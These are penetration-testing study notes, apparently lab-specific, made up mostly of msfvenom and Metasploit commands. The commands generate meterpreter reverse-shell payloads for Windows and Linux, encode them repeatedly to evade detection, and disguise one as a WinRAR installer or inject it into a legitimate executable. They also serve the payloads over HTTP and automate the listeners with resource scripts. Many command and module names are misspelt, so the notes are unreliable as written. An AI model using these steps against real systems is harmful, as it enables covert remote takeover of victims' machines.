# Client-side Attacks

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 5852–6017. Examples are lab-specific and need verification.

- Generating Payloads with msfvenom

    ```bash
    $msfvenom
    msfvenom --list payloads
    //staged and non staged payload
    msfvenom -a x86 -p windows/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payloads/payloadx86.exe
    msfvenom -a x64 -p windows/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payloads/payloadx64.exe
    cd Desktop/Windows_Payloads/
    ls
    //output formate
    msfvenom --list formats
    //linux payload create
    cd ..
    cd Desktop
    msfvenom -a x86 -p linux/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > ~/Desktop/Linux_Payloads/payloadx86
    cd Linux_Payloads
    ls
    chmod +x payloadx86
    msfvenom -a x64 -p linux/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > ~/Desktop/Linux_Payloads/payloadx64
    ls
    cd ..
    ls
    cd Windows_Payloads/
    ls
    sudo python -m SimpleHTTPServer 80

    //new tab
    msfconsole
    use multi/handler
    set payload windows/meterperter/reverse_tcp
    set LHOST 10.10.10.5
    set LPORT 1234
    run

    //windows browser
    ip          //in the search bar up

    /set  paylodad linux/meterperter/reverse_tcp
    run

    ```

- Encoding Payloads with msfvenom

    ```bash
    cd Desktop
    msfvenom --list encoders
    msfvenom -p windows/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
    ls
    cd Windows_Payloads/
    ls
    rm encodedx86
    msfvenom -p windows/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai **-i 10** -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
    ls
    msfvenom -p linux/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai **-i 10** -f elf > ~/Desktop/Linux_Payloads/encodedx86
    ls
    cd ..
    cd Linux_Payloads
    ls
    sudo python -m SimpleHTTPServer 80

    ..new tap
    msfconsole
    use multi/handler
    set payload windows/meterperter/reverse_tcp
    set LHOST 10.10.10.5
    set LPORT 1234
    run
    //windows browser system
    meterpreter>sysinfo

    ```

- Injecting Payloads into windows portable executables

    ```bash
    $msfvenom

    //firefox > winRAR >download >windRAR 6.02 Englinsh 32 bit
    msfvenom -p windows/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 **-i 10** -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/winrar.exe
    ls
    cd Desktop/Windows_Payloads/
    ls
    sudo python -m SimpleHTTPServer 80

    //another tab
    msfconsole
    use multi/handler
    set payload windows/meterperter/reverse_tcp
    set LHOST 10.10.10.5
    set LPORT 1234
    run

    //windows web server and download from http://ip and file: payloadx64.exe
    //winrar file and give the pass

    meterpreter>sysinfo
    run post/windows/manage/migrate
    sysinfo
    ls

    $/Desktop/Windows_Payload$ msfvenom -p windows/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x > ~/Desktop/Windows_Payloads/winrar.exe
    ls

    ```

- Automating metasploit with resource scripts

    ```bash
    ls -al /usr/share/metarplolit-framework/scriopts/resource/

    msfconsole
    use multi/handler
    set payload windows/meterperter/reverse_tcp
    set LHOST 10.10.10.5
    set LPORT 1234
    run

    exit
    /Desktop/Windows_Payloads$ ls
    vim handler.rc
    use multi/handler
    set payload windows/meterperter/reverse_tcp
    set LHOST 10.10.10.5
    set LPORT 1234
    run
    //go to vim and set the payload and :wq
    msfconsole -r hander.rc
    exit

    vim posrtscan.rc
    use auxiliary/scanner/portscan/tcp
    set RHOSTS 10.10.10.5
    run
    //enter and :wq
    exit
    msfconsole -r portscan.rc
    //automatically run this
    //anothe example

    vim db_status
    db_status
    workspace
    workspace -a Test
    //enter and :wq
    msfconfconsole -r db_status.rc
    exit

    msfconsole
    resource ~/Desktop/Windows_Payload/handler.rc
    exit

    msfconsole
    use auxiliary/scanner/portscan/tcp
    set rhosts ip
    run
    makerc ~Desktop/portscan.rc
    cd ..
    sudo su
    cd /root/DEsktop/
    ls
    cat portscan.rc
    ```
